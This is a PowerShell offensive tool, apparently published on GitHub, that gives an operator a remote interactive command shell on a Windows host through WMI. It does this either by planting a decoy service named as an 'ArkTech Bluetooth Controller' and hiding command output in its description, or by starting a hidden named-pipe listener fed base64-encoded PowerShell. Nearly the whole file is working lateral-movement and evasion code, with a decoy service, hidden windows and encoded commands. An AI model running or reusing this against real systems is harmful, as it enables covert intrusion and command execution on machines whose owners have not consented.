<#
 .DESCRIPTION: Achieve a remote interactive (limited) shell on a remote Windows computer using WMI with facilitation from either a Windows Service or Named Pipe
 .AUTHOR: github.com/joeavanzato
 .PARAMETERS:
#>

Param
(
    [Parameter(Mandatory)]
    [ValidateSet("Service","NamedPipe")]
    [String[]]$Method,
    [String]$serviceName = "arktechbtcontrol",
    [String]$serviceDisplayName = "ArkTech Bluetooth Controller",
    [String]$servicePathName = "C:\Windows\System32\drivers\aktbtc.sys",
    [String]$serviceStartMode = "Disabled",
    [Boolean]$serviceDesktopInteract = $false,
    [Int32]$serviceType = 16,
    [String]$templateDescription = "Bluetooth controller for ArkTech Hardware",
    [Parameter(Mandatory)]
    [String]$target_computer
)


function GetCommand {
    $command = Read-Host -Prompt "[cmd.exe on: $target_computer] "
    if ($Method -eq "NamedPipe"){
        RunNamedPipeCommand $command
    } elseif ($Method -eq "Service"){
        RunServiceCommand $command
    }
}


function SetupService {
    # Checks if a service matching the input parameters exists on the target computer
    # If it does not exist, attempts to create it
    # If it does exist, attempts to set the description to ensure we have the appropriate permissions to modify and create metadata remotely
    #DesktopInteract
    #DisplayName
    #ErrorControl
    #LoadOrderGroup
    #LoadOrderGroupDependencies
    #Name
    #PathName
    ##ServiceDependencies
    #ServiceType
    #StartMode
    #StartName
    #StartPassword
    $service_obj = Get-WmiObject -ComputerName $target_computer -Class Win32_Service -namespace "root\cimv2" -Filter "Name = '$serviceName'" -Locale "MS_409"
    if ($service_obj){
        Write-Host "[+] Service already exists, skipping creation.."
    } else {
        $service_create_result = Invoke-WmiMethod -ComputerName $target_computer -Path Win32_Service -Name Create -ArgumentList $false,$serviceDisplayName,0,$null,$null,$serviceName,$servicePathName,$null,$serviceType,$serviceStartMode,"LocalSystem",$null -Locale "MS_409"
        if ($service_create_result.ReturnValue -ne 0){
            Write-Host "[!] Error creating service - Return Value: $($service_create_result.ReturnValue)"
            return $false
        } else {
            Write-Host "[+] Service Successfully Created!"
        }
    }
    $description_set_result = Invoke-WmiMethod -ComputerName $target_computer -Namespace root\default -Class stdregprov -Name SetStringValue @(2147483650, "System\CurrentControlSet\Services\$serviceName", $templateDescription, "Description") -Locale "MS_409"
    if ($description_set_result.ReturnValue -ne 0){
        Write-Host "[!] Error setting description - Return Value: $($service_create_result.ReturnValue)"
        return $false
    } else {
        Write-Host "[+] Service Description Successfully Modified!"
        return $true
    }
}

function FormatCommandServiceFile($cmd, $filename){
    $random = Get-Random -Minimum 95959595 -Maximum 199999999
    $filename = "C:\Windows\temp\$random-temp.txt"
    $CommandSetup = "echo 1 > dir$filename | Out-Null;$cmd > $filename | Out-Null;`$content = Get-Content -Raw -Path $filename;`$content2 = `$content -replace ('\r\n','_NL_') -replace ('\s','_S_') -replace('\t','_T_');Set-Service -Name $serviceName -Description `$content2; Remove-Item $filename"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($CommandSetup)
    $b64 =[Convert]::ToBase64String($Bytes)
    $execute = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $b64"
    return $execute
}



function RunServiceCommandFileless ($cmd){
    # TODO
}


function RunNamedPipeCommand ($command) {
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $b64 =[Convert]::ToBase64String($Bytes)
    $execute = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $b64"
    #Write-Host "Executing: $execute"
    try{
        $sw.WriteLine($execute)
        $sw.Flush()
        while ($true){
            # here we can do a read until null loop and return to command entry once nulled
            $data = $sr.ReadLine()
            if ($data -eq "ENDOFMESSAGE"){
                break
            } else {
                Write-Host $data
            }
        }
    } catch {
        Write-Host "Unable to Connect"
        Write-Host $_
        $pipe.Dispose()
        $sw.Dispose()
        $sr.Dispose()
        return
    }
    GetCommand
}

function SetupNamedPipe (){
    # Launch a continuouslly listening named pipe on remote target
    # Pipe listens for B64 encoded commands and executes via powershell
    # If pipe receives 'quit'/'exit', pipe is terminated
    $pipeName = Get-Random -Minimum 100000000 -Maximum 1000000000
    Write-Host "[*] Pipe Name: $pipeName"
    # Below script launches a server InOut pipe on the remote target, listens for inbound commands, executes and returns the stdout
    # TODO - Better error handling
    $pipeScript = @"
`$pipe = [System.IO.Pipes.NamedPipeServerStream]::new("$pipeName",'InOut')
`$conn = `$pipe.WaitForConnection()
`$sr = [System.IO.StreamReader]::new(`$pipe)
`$sw = [System.IO.StreamWriter]::new(`$pipe)
while (`$true){
    `$data = `$null
    if (`$pipe.IsConnected) {
        `$data = `$sr.ReadLine()
        if (`$data -eq "") {
            continue
        }
        Write-host "Received Data: `$data"
        if (`$data -eq "exit" -or `$data -eq "quit"){
            `$sw.WriteLine("ENDOFMESSAGE")
            `$sw.Flush()
            break
        }
        `$output = cmd /c `$data
        `$output_strings = `$output -Split([Environment]::NewLine)
        foreach (`$item in `$output_strings) {
            `$sw.WriteLine(`$item)
        }
        `$sw.WriteLine("ENDOFMESSAGE")
        `$sw.Flush()
    }
}
finally{
    `$sw.Dispose()
    `$sr.Dispose()
    `$pipe.Dispose()
}
`$sw.Dispose()
`$sr.Dispose()
`$pipe.Dispose()
"@
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($pipeScript)
    $b64 =[Convert]::ToBase64String($Bytes)
    $execute = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $b64"
    $processData = Invoke-WmiMethod -ComputerName $target_computer -Class Win32_Process -Name Create -ArgumentList "$execute" -Locale "MS_409"
    if ($processData.ReturnValue -ne 0){
        Write-Host "Error Starting Process, Return Value: $($processData.ReturnValue)"
        return
    } else {
        Start-Sleep 1
        $script:pipe = [System.IO.Pipes.NamedPipeClientStream]::new("$target_computer","$pipeName",'InOut')
        try {
            $pipe.Connect(10000)
        }
        catch {
            Write-Host "Unable to Connect to Named Pipe"
            Write-Host $_
            return
        }
        Start-Sleep 1
        $script:sw = [System.IO.StreamWriter]::new($pipe)
        $script:sr = [System.IO.StreamReader]::new($pipe)
        GetCommand
    }
}


function RunServiceCommand ($cmd) {
    # Prepares a PowerShell encoded command which echoes the passed command into a file - this file is then read and the service description is modified to contain the STDOUT
    # This is done because WMI cannot read STDOUT of executed commands nor can it directly read the contents of a file remotely - but it can read service metadata remotely
    # A secondary option would be to format the output directly into the Service Description
    $random = Get-Random -Minimum 95959595 -Maximum 199999999
    $filename = "C:\Windows\temp\$random-temp.txt"
    $execute = FormatCommandServiceFile($cmd, $filename)
    $file_wmi = $filename -replace ("\\","\\")
    $processData = Invoke-WmiMethod -ComputerName $target_computer -Class Win32_Process -Name Create -ArgumentList "$execute" -Locale "MS_409"
    if ($processData.ReturnValue -ne 0){
        Write-Host "Error Starting Process, Return Value: $($processData.ReturnValue)"
    } else {
        while ($true){
            Start-Sleep 1
            $newProcData = Get-WmiObject -ComputerName $target_computer -Class Win32_Process -Locale "MS_409" -Filter "ProcessID=$($processData.ProcessId)"
            if ($newProcData -eq $null){
                # Process has terminated
                Write-
                Write-Host "[*] Checking Output..`r`n"
                $output = Invoke-WmiMethod -ComputerName $target_computer -Namespace root\default -Class stdregprov -Name GetStringValue @(2147483650, "System\CurrentControlSet\Services\$serviceName", "Description") -Locale "MS_409" | select svalue
                $output2 = $output.svalue -replace ("_NL_","`r`n") -replace ("_S_"," ") -replace("_T_","  ")
                if (-not ($output2 -eq $templateDescription)){
                    Invoke-WmiMethod -ComputerName $target_computer -Namespace root\default -Class stdregprov -Name SetStringValue @(2147483650, "System\CurrentControlSet\Services\$serviceName", $templateDescription, "Description") -Locale "MS_409" | Out-Null
                    Write-Host $output2
                    break
                }
                $object = Get-WmiObject -ComputerName $target_computer -Class CIM_DataFile -namespace "root\cimv2" -Filter "Name = '$file_wmi'" -Locale "MS_409" | Select FileSize
                if (-not $object){
                    Write-Host "[!] Error - Output file removed but service description intact - output too long or invalid command"
                    break
                }
            } else {
                Start-Sleep 1
                Write-Host "[*] Waiting for Process Termination"
            }
        }


    }
    GetCommand
}

function Main {
    if ($Method -eq "Service")
    {
        if (SetupService){
            GetCommand
        } else {
            Write-Host "[!] Error setting up remote service!"
        }
    } elseif ($Method -eq "NamedPipe"){
        SetupNamedPipe
    }
}
Main